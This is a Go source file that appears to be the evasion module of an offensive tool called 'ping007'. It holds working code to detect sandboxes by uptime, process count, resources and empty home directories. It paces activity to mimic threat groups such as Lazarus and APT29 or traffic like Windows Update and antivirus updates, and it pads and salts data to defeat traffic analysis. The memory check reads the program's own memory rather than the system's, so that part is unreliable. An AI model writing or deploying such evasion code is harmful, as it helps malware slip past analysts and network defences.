package evasion

import (
	"crypto/rand"
	"fmt"
	"math"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"ping007/pkg/types"
)

type EvasionEngine struct {
	config            EvasionConfig
	sandboxDetector   *SandboxDetector
	timingController  *TimingController
	trafficObfuscator *TrafficObfuscator
	mu                sync.RWMutex
}

type EvasionConfig struct {
	CryptoAgility             bool
	AntiSandbox               AntiSandboxConfig
	TimingEvasion             TimingEvasionConfig
	TrafficAnalysisResistance bool
	PaddingSizes              []int
	FakeDataInjectionRate     float64
}

type AntiSandboxConfig struct {
	Enabled      bool
	StrictMode   bool
	Checks       []string
	MinUptime    time.Duration
	MinProcesses int
}

type TimingEvasionConfig struct {
	Enabled          bool
	AdaptiveDelays   bool
	ServiceMimicry   []string
	JitterPercentage float64
}

func NewEvasionEngine(config EvasionConfig) (*EvasionEngine, error) {
	engine := &EvasionEngine{
		config: config,
	}

	// Initialize components
	engine.sandboxDetector = NewSandboxDetector(config.AntiSandbox)
	engine.timingController = NewTimingController(config.TimingEvasion)
	engine.trafficObfuscator = NewTrafficObfuscator(config.PaddingSizes, config.FakeDataInjectionRate)

	return engine, nil
}

// PerformSandboxCheck checks if running in a sandbox environment
func (e *EvasionEngine) PerformSandboxCheck() (*types.SandboxDetectionResult, error) {
	if !e.config.AntiSandbox.Enabled {
		return &types.SandboxDetectionResult{
			IsSandbox:  false,
			Confidence: 0.0,
			CheckedAt:  time.Now(),
		}, nil
	}

	return e.sandboxDetector.DetectSandbox()
}

// CalculateAdaptiveDelay calculates timing delays for stealth
func (e *EvasionEngine) CalculateAdaptiveDelay(profile *types.TimingProfile, dataSize int) (time.Duration, error) {
	if !e.config.TimingEvasion.Enabled {
		return 0, nil
	}

	return e.timingController.CalculateDelay(profile, dataSize)
}

// ObfuscateData applies traffic obfuscation techniques
func (e *EvasionEngine) ObfuscateData(data []byte) ([]byte, error) {
	if !e.config.TrafficAnalysisResistance {
		return data, nil
	}

	return e.trafficObfuscator.ObfuscateData(data)
}

// GenerateTimingProfile creates a timing profile based on APT behavior
func (e *EvasionEngine) GenerateTimingProfile(aptProfile types.APTProfile) (*types.TimingProfile, error) {
	return e.timingController.GenerateAPTProfile(aptProfile)
}

// ApplyServiceMimicry adjusts behavior to mimic legitimate services
func (e *EvasionEngine) ApplyServiceMimicry(service string) error {
	return e.timingController.ApplyServiceMimicry(service)
}

// SandboxDetector handles anti-sandbox detection
type SandboxDetector struct {
	config AntiSandboxConfig
}

func NewSandboxDetector(config AntiSandboxConfig) *SandboxDetector {
	return &SandboxDetector{
		config: config,
	}
}

// DetectSandbox performs comprehensive sandbox detection
func (sd *SandboxDetector) DetectSandbox() (*types.SandboxDetectionResult, error) {
	result := &types.SandboxDetectionResult{
		CheckedAt:  time.Now(),
		Indicators: make([]string, 0),
		Details:    make(map[string]any),
	}

	var totalScore float64
	var checkCount int

	// Uptime check
	if contains(sd.config.Checks, "uptime") {
		score, indicator := sd.checkUptime()
		totalScore += score
		checkCount++
		if indicator != "" {
			result.Indicators = append(result.Indicators, indicator)
		}
	}

	// Process count check
	if contains(sd.config.Checks, "processes") {
		score, indicator := sd.checkProcessCount()
		totalScore += score
		checkCount++
		if indicator != "" {
			result.Indicators = append(result.Indicators, indicator)
		}
	}

	// Resource availability check
	if contains(sd.config.Checks, "resources") {
		score, indicator := sd.checkResources()
		totalScore += score
		checkCount++
		if indicator != "" {
			result.Indicators = append(result.Indicators, indicator)
		}
	}

	// Activity detection
	if contains(sd.config.Checks, "activity") {
		score, indicator := sd.checkUserActivity()
		totalScore += score
		checkCount++
		if indicator != "" {
			result.Indicators = append(result.Indicators, indicator)
		}
	}

	// Calculate confidence
	if checkCount > 0 {
		result.Confidence = totalScore / float64(checkCount)
	}

	// Determine if sandbox
	threshold := 0.5
	if sd.config.StrictMode {
		threshold = 0.3
	}
	result.IsSandbox = result.Confidence >= threshold

	return result, nil
}

// checkUptime verifies system uptime
func (sd *SandboxDetector) checkUptime() (float64, string) {
	// Read uptime from /proc/uptime on Linux
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err != nil {
			return 0, ""
		}

		fields := strings.Fields(string(data))
		if len(fields) > 0 {
			uptimeSeconds, err := strconv.ParseFloat(fields[0], 64)
			if err != nil {
				return 0, ""
			}

			uptime := time.Duration(uptimeSeconds) * time.Second
			if uptime < sd.config.MinUptime {
				return 0.8, fmt.Sprintf("Low uptime: %v (min: %v)", uptime, sd.config.MinUptime)
			}
		}
	}

	return 0, ""
}

// checkProcessCount verifies reasonable process count
func (sd *SandboxDetector) checkProcessCount() (float64, string) {
	// Count processes in /proc on Linux
	if runtime.GOOS == "linux" {
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return 0, ""
		}

		processCount := 0
		for _, entry := range entries {
			if entry.IsDir() {
				// Check if directory name is numeric (PID)
				if _, err := strconv.Atoi(entry.Name()); err == nil {
					processCount++
				}
			}
		}

		if processCount < sd.config.MinProcesses {
			return 0.7, fmt.Sprintf("Low process count: %d (min: %d)", processCount, sd.config.MinProcesses)
		}
	}

	return 0, ""
}

// checkResources verifies system resource availability
func (sd *SandboxDetector) checkResources() (float64, string) {
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	// Check available memory (basic heuristic)
	totalMemMB := memStats.Sys / 1024 / 1024
	if totalMemMB < 1024 { // Less than 1GB system memory
		return 0.6, fmt.Sprintf("Low system memory: %d MB", totalMemMB)
	}

	// Check CPU count
	cpuCount := runtime.NumCPU()
	if cpuCount < 2 {
		return 0.5, fmt.Sprintf("Low CPU count: %d", cpuCount)
	}

	return 0, ""
}

// checkUserActivity detects signs of user activity
func (sd *SandboxDetector) checkUserActivity() (float64, string) {
	// Check for common user directories
	userDirs := []string{"/home", "/Users"}
	for _, dir := range userDirs {
		if _, err := os.Stat(dir); err == nil {
			entries, err := os.ReadDir(dir)
			if err == nil && len(entries) == 0 {
				return 0.4, "Empty user directories"
			}
		}
	}

	return 0, ""
}

// TimingController manages adaptive timing and delays
type TimingController struct {
	config          TimingEvasionConfig
	currentProfile  *types.TimingProfile
	serviceProfiles map[string]*types.TimingProfile
	mu              sync.RWMutex
}

func NewTimingController(config TimingEvasionConfig) *TimingController {
	tc := &TimingController{
		config:          config,
		serviceProfiles: make(map[string]*types.TimingProfile),
	}

	tc.initializeServiceProfiles()
	return tc
}

// initializeServiceProfiles sets up timing profiles for service mimicry
func (tc *TimingController) initializeServiceProfiles() {
	// Windows Update mimicry
	tc.serviceProfiles["windows_update"] = &types.TimingProfile{
		MinDelay:         30 * time.Second,
		MaxDelay:         5 * time.Minute,
		JitterFactor:     0.2,
		BurstProbability: 0.1,
		PauseProbability: 0.3,
		ActivityPattern:  []float64{0.1, 0.1, 0.2, 0.3, 0.8, 0.9, 0.7, 0.5, 0.3, 0.2, 0.1, 0.1},
	}

	// NTP sync mimicry
	tc.serviceProfiles["ntp_sync"] = &types.TimingProfile{
		MinDelay:         15 * time.Minute,
		MaxDelay:         1 * time.Hour,
		JitterFactor:     0.1,
		BurstProbability: 0.05,
		PauseProbability: 0.1,
		ActivityPattern:  []float64{0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5},
	}

	// Antivirus update mimicry
	tc.serviceProfiles["antivirus"] = &types.TimingProfile{
		MinDelay:         1 * time.Hour,
		MaxDelay:         6 * time.Hour,
		JitterFactor:     0.25,
		BurstProbability: 0.2,
		PauseProbability: 0.15,
		ActivityPattern:  []float64{0.2, 0.1, 0.1, 0.1, 0.3, 0.5, 0.7, 0.8, 0.6, 0.4, 0.3, 0.2},
	}
}

// CalculateDelay calculates an adaptive delay based on timing profile
func (tc *TimingController) CalculateDelay(profile *types.TimingProfile, dataSize int) (time.Duration, error) {
	if !tc.config.Enabled {
		return 0, nil
	}

	tc.mu.RLock()
	defer tc.mu.RUnlock()

	// Base delay calculation
	baseDelay := profile.MinDelay + time.Duration(float64(profile.MaxDelay-profile.MinDelay)*generateRandomFloat())

	// Apply jitter
	jitter := 1.0 + (generateRandomFloat()-0.5)*2*profile.JitterFactor
	delay := time.Duration(float64(baseDelay) * jitter)

	// Size-based adjustment
	if dataSize > 1024 {
		sizeFactor := math.Log(float64(dataSize) / 1024.0)
		delay = time.Duration(float64(delay) * (1.0 + sizeFactor*0.1))
	}

	// Apply burst or pause probability
	if generateRandomFloat() < profile.BurstProbability {
		delay = delay / 3 // Burst mode - reduce delay
	} else if generateRandomFloat() < profile.PauseProbability {
		delay = delay * 2 // Pause mode - increase delay
	}

	return delay, nil
}

// GenerateAPTProfile creates a timing profile based on APT characteristics
func (tc *TimingController) GenerateAPTProfile(aptProfile types.APTProfile) (*types.TimingProfile, error) {
	switch aptProfile {
	case types.APTLazarus:
		return &types.TimingProfile{
			MinDelay:         5 * time.Minute,
			MaxDelay:         1 * time.Hour,
			JitterFactor:     0.2,
			BurstProbability: 0.15,
			PauseProbability: 0.25,
			ActivityPattern:  []float64{0.1, 0.1, 0.2, 0.4, 0.6, 0.8, 0.9, 0.7, 0.5, 0.3, 0.2, 0.1},
		}, nil

	case types.APTAPT29:
		return &types.TimingProfile{
			MinDelay:         30 * time.Minute,
			MaxDelay:         2 * time.Hour,
			JitterFactor:     0.1,
			BurstProbability: 0.05,
			PauseProbability: 0.4,
			ActivityPattern:  []float64{0.2, 0.1, 0.1, 0.3, 0.5, 0.7, 0.8, 0.6, 0.4, 0.3, 0.2, 0.2},
		}, nil

	case types.APTAPT28:
		return &types.TimingProfile{
			MinDelay:         10 * time.Minute,
			MaxDelay:         30 * time.Minute,
			JitterFactor:     0.3,
			BurstProbability: 0.25,
			PauseProbability: 0.1,
			ActivityPattern:  []float64{0.3, 0.2, 0.2, 0.4, 0.6, 0.8, 0.9, 0.8, 0.6, 0.4, 0.3, 0.3},
		}, nil

	case types.APTEquation:
		return &types.TimingProfile{
			MinDelay:         1 * time.Hour,
			MaxDelay:         3 * 24 * time.Hour, // 3 days
			JitterFactor:     0.05,
			BurstProbability: 0.02,
			PauseProbability: 0.6,
			ActivityPattern:  []float64{0.1, 0.05, 0.05, 0.1, 0.2, 0.3, 0.4, 0.3, 0.2, 0.15, 0.1, 0.1},
		}, nil

	default:
		return nil, fmt.Errorf("unknown APT profile: %s", aptProfile)
	}
}

// ApplyServiceMimicry applies a specific service timing pattern
func (tc *TimingController) ApplyServiceMimicry(service string) error {
	tc.mu.Lock()
	defer tc.mu.Unlock()

	profile, exists := tc.serviceProfiles[service]
	if !exists {
		return fmt.Errorf("unknown service profile: %s", service)
	}

	tc.currentProfile = profile
	return nil
}

// TrafficObfuscator handles data obfuscation and padding
type TrafficObfuscator struct {
	paddingSizes          []int
	fakeDataInjectionRate float64
	mu                    sync.RWMutex
}

func NewTrafficObfuscator(paddingSizes []int, fakeDataRate float64) *TrafficObfuscator {
	return &TrafficObfuscator{
		paddingSizes:          paddingSizes,
		fakeDataInjectionRate: fakeDataRate,
	}
}

// ObfuscateData applies traffic obfuscation techniques
func (to *TrafficObfuscator) ObfuscateData(data []byte) ([]byte, error) {
	to.mu.RLock()
	defer to.mu.RUnlock()

	result := make([]byte, len(data))
	copy(result, data)

	// Apply padding
	result = to.applyPadding(result)

	// Inject fake data
	if generateRandomFloat() < to.fakeDataInjectionRate {
		result = to.injectFakeData(result)
	}

	return result, nil
}

// applyPadding adds random padding to data
func (to *TrafficObfuscator) applyPadding(data []byte) []byte {
	if len(to.paddingSizes) == 0 {
		return data
	}

	// Select random padding size
	paddingSize := to.paddingSizes[int(generateRandomFloat()*float64(len(to.paddingSizes)))]

	// Generate random padding
	padding := make([]byte, paddingSize)
	rand.Read(padding)

	return append(data, padding...)
}

// injectFakeData injects decoy data
func (to *TrafficObfuscator) injectFakeData(data []byte) []byte {
	// Generate fake data of random size
	fakeSize := int(generateRandomFloat() * 256)
	fakeData := make([]byte, fakeSize)
	rand.Read(fakeData)

	// Insert at random position
	insertPos := int(generateRandomFloat() * float64(len(data)))

	result := make([]byte, 0, len(data)+len(fakeData))
	result = append(result, data[:insertPos]...)
	result = append(result, fakeData...)
	result = append(result, data[insertPos:]...)

	return result
}

// Helper functions

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func generateRandomFloat() float64 {
	// Simple random number generation
	buffer := make([]byte, 8)
	rand.Read(buffer)

	// Convert to uint64 then to float64
	var value uint64
	for i, b := range buffer {
		value |= uint64(b) << (i * 8)
	}

	return float64(value) / float64(^uint64(0))
}